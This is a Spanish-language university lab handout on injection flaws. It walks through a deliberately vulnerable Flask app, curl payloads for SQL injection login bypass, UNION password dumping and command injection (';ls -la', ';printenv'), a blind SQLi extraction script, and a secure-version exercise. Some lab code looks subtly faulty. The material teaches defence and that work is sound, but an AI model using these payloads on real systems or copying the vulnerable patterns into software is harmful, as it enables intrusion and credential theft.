# LABORATORIO EN CASA — SEMANA 5
# PROGRAMACIÓN SEGURA — DD281
# Universidad Autónoma del Perú | Facultad de Ingeniería y Arquitectura

```
Nombre: _________________________________ Código: ______________
Pareja (opcional): _______________________ Código: ______________
Fecha de entrega: ________________________

OBJETIVO: Implementar y explotar vulnerabilidades de inyección en un entorno controlado,
comprendiendo el impacto real y aplicando los controles de seguridad correspondientes.

COMPETENCIA: Identifica y remedia vulnerabilidades de inyección SQL, NoSQL y Command
en aplicaciones web mediante análisis de código y pruebas controladas.

Tiempo estimado: 2 horas
Entregable: Repositorio GitHub con código + capturas + informe INFORME_LAB5.md
```

---

## SOFTWARE Y HERRAMIENTAS REQUERIDAS

1. **Python 3.10+** — https://www.python.org/downloads/
   - Verificar: `python3 --version` → debe mostrar 3.10 o superior
2. **Flask 3.0** — `pip install flask`
   - Verificar: `python3 -c "import flask; print(flask.__version__)"`
3. **SQLite3** — incluido con Python (no requiere instalación)
   - Verificar: `python3 -c "import sqlite3; print(sqlite3.version)"`
4. **Requests** — `pip install requests`
5. **Navegador web** — Chrome o Firefox con DevTools
6. **Editor de código** — VS Code recomendado (https://code.visualstudio.com)

Instalación en un solo comando:
```bash
pip install flask requests
```

**Alternativa online si no puedes instalar:** Usar Replit.com
- Ir a https://replit.com → New Repl → Python → pegar el código

---

## PARTE 1 — EXPLORACIÓN: El entorno vulnerable (30 min)

### Paso 1.1 — Crear el proyecto
```bash
mkdir lab_inyecciones_s5
cd lab_inyecciones_s5
mkdir templates static
```

### Paso 1.2 — Crear la base de datos de prueba

Crea el archivo `setup_db.py`:

```python
#!/usr/bin/env python3
"""
setup_db.py — Inicializa la base de datos de demostración
IMPORTANTE: Esta base de datos contiene datos FICTICIOS solo para el laboratorio
"""
import sqlite3
import os

DB_PATH = "tienda.db"

def crear_base_datos():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Tabla de usuarios (con contraseñas en texto plano para simplificar el lab)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY,
            usuario TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            rol TEXT DEFAULT 'cliente',
            email TEXT
        )
    """)
    
    # Tabla de productos
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS productos (
            id INTEGER PRIMARY KEY,
            nombre TEXT NOT NULL,
            precio REAL NOT NULL,
            categoria TEXT NOT NULL,
            stock INTEGER DEFAULT 0
        )
    """)
    
    # Tabla de pedidos (información sensible)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS pedidos (
            id INTEGER PRIMARY KEY,
            usuario_id INTEGER,
            monto REAL,
            tarjeta TEXT,  -- últimos 4 dígitos
            estado TEXT DEFAULT 'pendiente'
        )
    """)
    
    # Datos de prueba — TODOS FICTICIOS
    usuarios = [
        (1, 'admin',    'AdminPass123', 'admin',   'admin@tienda.com'),
        (2, 'juan',     'juan2024',     'cliente',  'juan@email.com'),
        (3, 'maria',    'maria123',     'cliente',  'maria@email.com'),
        (4, 'vendedor', 'vend456',      'vendedor', 'ventas@tienda.com'),
    ]
    
    productos = [
        (1, 'Laptop HP 15',    2499.00, 'electronica', 15),
        (2, 'Mouse Logitech',    89.00, 'electronica', 50),
        (3, 'Cuaderno A4',       12.50, 'utiles',      200),
        (4, 'Memoria USB 64GB', 45.00,  'electronica', 30),
        (5, 'Mochila Escolar',  85.00,  'accesorios',  40),
    ]
    
    pedidos = [
        (1, 2, 2499.00, '****1234', 'completado'),
        (2, 3, 89.00,   '****5678', 'pendiente'),
        (3, 2, 130.00,  '****9012', 'completado'),
    ]
    
    cursor.executemany("INSERT OR IGNORE INTO usuarios VALUES (?,?,?,?,?)", usuarios)
    cursor.executemany("INSERT OR IGNORE INTO productos VALUES (?,?,?,?,?)", productos)
    cursor.executemany("INSERT OR IGNORE INTO pedidos VALUES (?,?,?,?,?)", pedidos)
    
    conn.commit()
    conn.close()
    print(f"✓ Base de datos creada: {DB_PATH}")
    print(f"  Usuarios: {len(usuarios)} | Productos: {len(productos)} | Pedidos: {len(pedidos)}")

if __name__ == "__main__":
    crear_base_datos()
```

Ejecutar: `python3 setup_db.py`

### Paso 1.3 — La aplicación VULNERABLE (para análisis)

Crea el archivo `app_vulnerable.py`:

```python
#!/usr/bin/env python3
"""
app_vulnerable.py — Aplicación con vulnerabilidades INTENCIONALES para laboratorio.
PROPÓSITO EDUCATIVO ÚNICAMENTE — NUNCA usar en producción.
"""
import sqlite3
import os
from flask import Flask, request, jsonify

app = Flask(__name__)
DB_PATH = "tienda.db"

def get_db():
    """Conecta a la base de datos SQLite."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row  # Permite acceder por nombre de columna
    return conn

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT 1: Login — SQL Injection clásico
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/login', methods=['POST'])
def login_inseguro():
    """
    VULNERABLE A: SQL Injection clásico
    
    Prueba estos payloads en el campo 'usuario':
    - admin'--          → Acceso sin contraseña
    - ' OR '1'='1'--    → Acceso con cualquier contraseña  
    - ' OR 1=1--        → Alternativa sin comillas en el valor
    """
    data = request.json or {}
    usuario  = data.get('usuario', '')
    password = data.get('password', '')
    
    # VULNERABILIDAD: concatenación directa del input en SQL
    query = f"SELECT id, usuario, rol FROM usuarios WHERE usuario='{usuario}' AND password='{password}'"
    
    # Para el lab: mostrar la consulta generada (NUNCA en producción)
    print(f"[DEBUG] Consulta ejecutada: {query}")
    
    try:
        resultado = cursor = conn = get_db()
        conn = get_db()
        cursor = conn.cursor()
        resultado = cursor.execute(query).fetchone()
        conn.close()
        
        if resultado:
            return jsonify({
                "status": "success",
                "mensaje": f"Bienvenido {resultado['usuario']}",
                "rol": resultado['rol'],
                "query_debug": query  # Solo para el lab
            })
        return jsonify({"status": "error", "mensaje": "Credenciales incorrectas"})
    
    except sqlite3.Error as e:
        # VULNERABILIDAD adicional: exponer el error de BD
        return jsonify({"status": "error", "error_bd": str(e), "query": query}), 500

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT 2: Buscar productos — UNION-based SQLi
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/buscar', methods=['GET'])
def buscar_inseguro():
    """
    VULNERABLE A: UNION-based SQL Injection
    
    Payload para extraer usuarios:
    ?categoria=electronica' UNION SELECT id,usuario,password,rol,email FROM usuarios--
    """
    categoria = request.args.get('categoria', '')
    
    conn = get_db()
    cursor = conn.cursor()
    
    # VULNERABILIDAD: concatenación en SELECT
    query = f"SELECT id, nombre, precio, categoria, stock FROM productos WHERE categoria='{categoria}'"
    print(f"[DEBUG] Consulta: {query}")
    
    try:
        resultados = cursor.execute(query).fetchall()
        conn.close()
        return jsonify({
            "productos": [dict(r) for r in resultados],
            "query_debug": query,
            "total": len(resultados)
        })
    except sqlite3.Error as e:
        return jsonify({"error": str(e), "query": query}), 500

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT 3: Diagnóstico — Command Injection
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/diagnostico', methods=['GET'])
def diagnostico_inseguro():
    """
    VULNERABLE A: Command Injection
    
    Payload de ataque:
    ?host=127.0.0.1; ls -la
    ?host=127.0.0.1; cat tienda.db  (puede exponer la BD)
    ?host=127.0.0.1 && whoami
    """
    host = request.args.get('host', '127.0.0.1')
    
    # VULNERABILIDAD: input del usuario en comando del sistema operativo
    import subprocess
    resultado = subprocess.run(
        f"ping -c 2 {host}",  # String con shell=True implícito
        shell=True,            # shell=True es el problema
        capture_output=True,
        text=True,
        timeout=10
    )
    
    return jsonify({
        "host": host,
        "output": resultado.stdout,
        "errores": resultado.stderr
    })

if __name__ == '__main__':
    print("APLICACION VULNERABLE — Solo para uso educativo en laboratorio")
    print("   Acceder en: http://127.0.0.1:5000")
    app.run(debug=True, port=5000)
```

Ejecutar: `python3 app_vulnerable.py`

**Pregunta de reflexión 1.3:** Antes de continuar, lee el código y anota:
- ¿Cuántas vulnerabilidades identificas?
- ¿En qué línea exacta está cada una?
- ¿Qué tienen en común todas?

*Tu respuesta:* _______________

---

## PARTE 2 — APLICACIÓN: Explotar y defender (60 min)

### Paso 2.1 — Explotar SQL Injection en el login (15 min)

Abre una segunda terminal y ejecuta:

```bash
# Prueba 1: Login normal (debería funcionar)
curl -X POST http://127.0.0.1:5000/login \
  -H "Content-Type: application/json" \
  -d '{"usuario": "juan", "password": "juan2024"}'

# Prueba 2: SQL Injection básico — bypassear autenticación
curl -X POST http://127.0.0.1:5000/login \
  -H "Content-Type: application/json" \
  -d '{"usuario": "admin'\''--", "password": "cualquiercosa"}'

# Prueba 3: OR injection — acceder sin conocer usuario
curl -X POST http://127.0.0.1:5000/login \
  -H "Content-Type: application/json" \
  -d "{\"usuario\": \"' OR '1'='1'--\", \"password\": \"\"}"
```

**Punto de verificación 2.1:** ¿Obtuviste acceso con credenciales incorrectas? Registra el resultado:
- Prueba 1: _______________
- Prueba 2: _______________
- Prueba 3: _______________

### Paso 2.2 — Explotar UNION-based SQLi en búsqueda (15 min)

```bash
# Búsqueda normal
curl "http://127.0.0.1:5000/buscar?categoria=electronica"

# Determinar número de columnas primero
curl "http://127.0.0.1:5000/buscar?categoria=electronica'%20ORDER%20BY%201--"
curl "http://127.0.0.1:5000/buscar?categoria=electronica'%20ORDER%20BY%205--"
curl "http://127.0.0.1:5000/buscar?categoria=electronica'%20ORDER%20BY%206--"

# UNION attack: extraer usuarios y contraseñas
curl "http://127.0.0.1:5000/buscar?categoria=nada'%20UNION%20SELECT%20id,usuario,password,rol,email%20FROM%20usuarios--"
```

**Pregunta de análisis 2.2:** ¿Cuántas columnas tiene la tabla productos? ¿Por qué es importante saberlo para el UNION attack?

*Tu respuesta:* _______________

### Paso 2.3 — Explotar Command Injection (10 min)

```bash
# Diagnóstico normal
curl "http://127.0.0.1:5000/diagnostico?host=127.0.0.1"

# Command injection — listar archivos del servidor
curl "http://127.0.0.1:5000/diagnostico?host=127.0.0.1;%20ls%20-la"

# Command injection — ver variables de entorno (podría tener credenciales)
curl "http://127.0.0.1:5000/diagnostico?host=127.0.0.1;%20printenv"
```

**Punto de verificación 2.3:** ¿Pudiste listar los archivos del servidor? ¿Qué información sensible encontraste?

*Tu respuesta:* _______________

### Paso 2.4 — Implementar la versión SEGURA (20 min)

Crea el archivo `app_segura.py` implementando los 3 endpoints sin las vulnerabilidades:

```python
#!/usr/bin/env python3
"""
app_segura.py — Implementación SEGURA de los mismos endpoints.
Tu tarea: completar los bloques marcados con ▶ TODO
"""
import sqlite3
import subprocess
import ipaddress
import re
from flask import Flask, request, jsonify

app = Flask(__name__)
DB_PATH = "tienda.db"

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT 1 SEGURO: Login con prepared statement
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/login', methods=['POST'])
def login_seguro():
    data = request.json or {}
    usuario  = data.get('usuario', '').strip()
    password = data.get('password', '')
    
    # ▶ TODO 1: Validar longitud del input (usuario max 50 chars, password max 128)
    # Escribe la validación aquí:
    # ...
    
    # ▶ TODO 2: Validar formato del usuario (solo alfanumérico + guion bajo)
    # Usa: re.match(r'^[a-zA-Z0-9_]{3,50}$', usuario)
    # ...
    
    conn = get_db()
    cursor = conn.cursor()
    
    # ▶ TODO 3: Reemplazar la consulta vulnerable por prepared statement
    # La consulta insegura era: f"SELECT ... WHERE usuario='{usuario}' AND password='{password}'"
    # La consulta segura debe ser: "SELECT ... WHERE usuario=? AND password=?"
    # con: cursor.execute(query, (usuario, password))
    # ...
    
    # Por ahora, placeholder para que el servidor arranque:
    resultado = None
    conn.close()
    
    if resultado:
        return jsonify({"status": "success", "mensaje": f"Bienvenido {resultado['usuario']}"})
    return jsonify({"status": "error", "mensaje": "Credenciales inválidas"})  # Mensaje genérico

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT 2 SEGURO: Buscar con prepared statement
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/buscar', methods=['GET'])
def buscar_seguro():
    categoria = request.args.get('categoria', '').strip()
    
    # ▶ TODO 4: Validar que categoria solo contenga letras (a-z) y guion bajo
    # ...
    
    conn = get_db()
    cursor = conn.cursor()
    
    # ▶ TODO 5: Usar prepared statement para la búsqueda
    # query = "SELECT id, nombre, precio, categoria, stock FROM productos WHERE categoria=?"
    # resultados = cursor.execute(query, (categoria,)).fetchall()
    # ...
    
    resultados = []
    conn.close()
    return jsonify({"productos": [dict(r) for r in resultados], "total": len(resultados)})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ENDPOINT 3 SEGURO: Diagnóstico sin Command Injection
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/diagnostico', methods=['GET'])
def diagnostico_seguro():
    host_raw = request.args.get('host', '')
    
    # ▶ TODO 6: Validar que es una IP pública válida
    # Usar ipaddress.ip_address(host_raw)
    # Rechazar IPs privadas: ip.is_private, ip.is_loopback, ip.is_reserved
    # ...
    
    # ▶ TODO 7: Ejecutar ping con subprocess en modo lista (SIN shell=True)
    # resultado = subprocess.run(["ping", "-c", "2", str(ip)], ...)
    # ...
    
    return jsonify({"error": "TODO: implementar"})

if __name__ == '__main__':
    print("Aplicación SEGURA — http://127.0.0.1:5001")
    app.run(debug=False, port=5001)
```

**Punto de verificación 2.4:** Completa todos los TODO y verifica que:
- El login rechace el payload `admin'--`
- La búsqueda rechace el payload UNION
- El diagnóstico rechace el payload `;ls -la`

---

## PARTE 3 — DESAFÍO: Blind SQL Injection manual (30 min)

La aplicación vulnerable tiene un endpoint adicional que no muestra errores de BD:

```python
# Agrega esto a app_vulnerable.py como nuevo endpoint
@app.route('/perfil/<int:user_id>')
def perfil(user_id):
    """
    Este endpoint muestra información del usuario pero NO errores de BD.
    ¿Puedes inferir la contraseña del admin usando Blind SQLi?
    """
    conn = get_db()
    # Nota: user_id es int, así que está protegido de SQLi básico
    # Pero el parámetro GET 'orden' no lo está
    orden = request.args.get('orden', 'id')
    
    # VULNERABILIDAD en el ORDER BY (difícil de parametrizar)
    query = f"SELECT usuario, email, rol FROM usuarios WHERE id={user_id} ORDER BY {orden}"
    try:
        resultado = conn.execute(query).fetchone()
        conn.close()
        if resultado:
            return jsonify({"existe": True, "usuario": resultado[0]})
        return jsonify({"existe": False})
    except:
        # Silencia los errores — hace el ataque más difícil (Blind)
        conn.close()
        return jsonify({"existe": False})
```

### Desafío 3.1 — Encontrar la versión de SQLite

```bash
# Prueba booleana: si existe el user_id=1 con condición verdadera
curl "http://127.0.0.1:5000/perfil/1?orden=CASE%20WHEN%201=1%20THEN%20id%20ELSE%20(SELECT%201%20FROM%20sqlite_master)%20END"

# Prueba booleana: con condición falsa
curl "http://127.0.0.1:5000/perfil/1?orden=CASE%20WHEN%201=2%20THEN%20id%20ELSE%20(SELECT%201%20FROM%20sqlite_master)%20END"
```

### Desafío 3.2 — Crear un script de Blind SQLi

Crea `blind_sqli.py` que automatice la extracción de la contraseña del admin carácter por carácter:

```python
#!/usr/bin/env python3
"""
blind_sqli.py — Demostración de ataque Blind SQLi automatizado
SOLO PARA USO EDUCATIVO en entorno de laboratorio local
"""
import requests

BASE_URL = "http://127.0.0.1:5000"
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$"

def probar_caracter(posicion: int, caracter: str) -> bool:
    """
    Prueba si el carácter en la posición dada de la contraseña del admin
    es igual al carácter dado. Usa Boolean-based Blind SQLi.
    """
    # Payload: evalúa si SUBSTR(password, posicion, 1) = caracter para usuario admin (id=1)
    payload = f"CASE WHEN SUBSTR((SELECT password FROM usuarios WHERE id=1),{posicion},1)='{caracter}' THEN id ELSE usuario END"
    
    # Codificar el payload para URL
    import urllib.parse
    payload_encoded = urllib.parse.quote(payload)
    
    url = f"{BASE_URL}/perfil/1?orden={payload_encoded}"
    
    try:
        respuesta = requests.get(url, timeout=5)
        data = respuesta.json()
        # Si la condición es verdadera, devuelve el perfil normal (existe=True)
        return data.get('existe', False)
    except:
        return False

def extraer_contrasena(max_len: int = 20) -> str:
    """Extrae la contraseña carácter por carácter."""
    contrasena = ""
    print("Iniciando extracción de contraseña por Blind SQLi...")
    
    for posicion in range(1, max_len + 1):
        encontrado = False
        for char in CHARS:
            if probar_caracter(posicion, char):
                contrasena += char
                print(f"  Posición {posicion}: '{char}' → Contraseña parcial: {contrasena}")
                encontrado = True
                break
        if not encontrado:
            # Si no encontró ningún carácter, terminó la contraseña
            print(f"  Fin de la contraseña en posición {posicion}")
            break
    
    return contrasena

if __name__ == "__main__":
    print("DEMOSTRACION EDUCATIVA — Solo ejecutar en el entorno de laboratorio local")
    print("=" * 60)
    contrasena = extraer_contrasena()
    print(f"\nContraseña extraída: '{contrasena}'")
    print("\nREFLEXIÓN: ¿Cuántas peticiones HTTP necesitó el ataque?")
    print("Esto muestra por qué el Blind SQLi es peligroso aunque no se vean errores")
```

**Pregunta de reflexión final:**

1. ¿Cuántas peticiones HTTP se necesitaron para extraer la contraseña? ¿Qué implica esto sobre los logs del servidor?
2. Si la contraseña estuviera hasheada con bcrypt, ¿seguiría siendo útil el ataque? ¿Por qué?
3. ¿Cómo implementarías rate limiting para dificultar este tipo de ataque?

*Tus respuestas:* _______________

---

## ENTREGABLES

Entrega una carpeta comprimida `LAB5_APELLIDO_NOMBRE.zip` con:

```
LAB5_APELLIDO_NOMBRE/
├── app_vulnerable.py          ← Sin modificar (tal como se proporcionó)
├── app_segura.py              ← Con todos los TODO completados
├── setup_db.py
├── blind_sqli.py
├── capturas/
│   ├── 01_login_normal.png           ← Login exitoso con juan
│   ├── 02_sqli_bypass.png            ← Bypass del login con admin'--
│   ├── 03_union_ataque.png           ← UNION extracting usuarios table
│   ├── 04_command_injection.png      ← ls -la ejecutado via /diagnostico
│   ├── 05_login_seguro_bloqueado.png ← Intento de bypass fallido en app_segura
│   └── 06_blind_sqli_resultado.png   ← Resultado del script blind_sqli.py
└── INFORME_LAB5.md                   ← Informe con respuestas a todas las preguntas
```

---

## RÚBRICA DE EVALUACIÓN

| Criterio | Excelente (4) | Suficiente (2-3) | Insuficiente (0-1) |
|---|---|---|---|
| app_segura.py funcional | Todos los TODO completos y correctos | Al menos 4 de 7 TODO completos | Menos de 4 TODO |
| Capturas de explotación | 6 capturas con resultados claros | 3-5 capturas | Menos de 3 capturas |
| blind_sqli.py ejecutado | Contraseña extraída correctamente | Script ejecuta pero no extrae | No ejecutado |
| INFORME_LAB5.md | Respuestas técnicas completas y reflexivas | Respuestas parciales | Sin informe |
| Calidad del código | Código limpio, comentado, funcional | Funciona con errores menores | No funciona |
| **Total** | **20 / 20** | **10-15 / 20** | **< 10 / 20** |
